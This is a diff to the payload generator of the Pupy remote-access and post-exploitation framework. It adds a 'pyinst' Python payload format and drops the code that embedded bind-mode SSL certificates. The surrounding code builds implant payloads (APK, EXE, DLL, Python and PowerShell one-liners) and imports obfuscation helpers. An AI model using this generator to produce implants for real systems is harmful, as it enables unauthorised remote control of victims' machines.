@@ -7,7 +7,7 @@ import logging, argparse, sys, os.path, re, shlex, random, string, zipfile, tarf
 from pupylib.utils.network import get_local_ip
 from pupylib.utils.term import colorize
 from pupylib.payloads.python_packer import gen_package_pickled_dic
-from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload, get_bind_certificates
+from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload, get_bind_certificates, getLinuxImportedModules
 from pupylib.utils.obfuscate import compress_encode_obfs
 from network.conf import transports, launchers
 from network.lib.base_launcher import LauncherError
@@ -254,7 +254,7 @@ class ListOptions(argparse.Action):
             print '\n'.join(["\t"+x for x in sc.get_help().split("\n")])
         exit()
 
-PAYLOAD_FORMATS=['apk', 'exe_x86', 'exe_x64', 'dll_x86', 'dll_x64', 'py', 'py_oneliner', 'ps1_oneliner']
+PAYLOAD_FORMATS=['apk', 'exe_x86', 'exe_x64', 'dll_x86', 'dll_x64', 'py', 'pyinst', 'py_oneliner', 'ps1_oneliner']
 if __name__=="__main__":
     if os.path.dirname(__file__):
         os.chdir(os.path.dirname(__file__))
@@ -331,20 +331,15 @@ if __name__=="__main__":
         if not outpath:
             outpath="pupy.apk"
         get_edit_apk(os.path.join("payload_templates","pupy.apk"), outpath, conf)
-    elif args.format=="py":
-        initPytonCode = ""
+    elif args.format=="py" or args.format=="pyinst":
+        linux_modules = ""
         if not outpath:
             outpath="payload.py"
+        if args.format=="pyinst" : 
+            linux_modules = getLinuxImportedModules()
         packed_payload=pack_py_payload(get_raw_conf(conf))
-        if args.launcher == "bind": #Searching the transport mode enabled with bind
-            l=launchers[conf['launcher']]()
-            l.parse_args(conf['launcher_args'])
-            t=transports[l.get_transport()]
-            if l.get_transport() == "ssl" or l.get_transport() == "ssl_rsa": #Have to write certificates (pub and priv) when ssl tansport is enabled
-                key, cert = get_bind_certificates()
-                initPytonCode = '''import os;\nwith open('bindserver.pem', 'wb') as w:\n\tw.write("""{0}""")\nwith open('bindcert.pem', 'wb') as w:\n\tw.write("""{1}""")'''.format(key, cert)
         with open(outpath, 'wb') as w:
-            w.write("#!/usr/bin/env python\n# -*- coding: UTF8 -*-\n{0}\n{1}".format(initPytonCode, packed_payload))
+            w.write("#!/usr/bin/env python\n# -*- coding: UTF8 -*-\n"+linux_modules+"\n"+packed_payload)
     elif args.format=="py_oneliner":
         packed_payload=pack_py_payload(get_raw_conf(conf))
         i=conf["launcher_args"].index("--host")+1
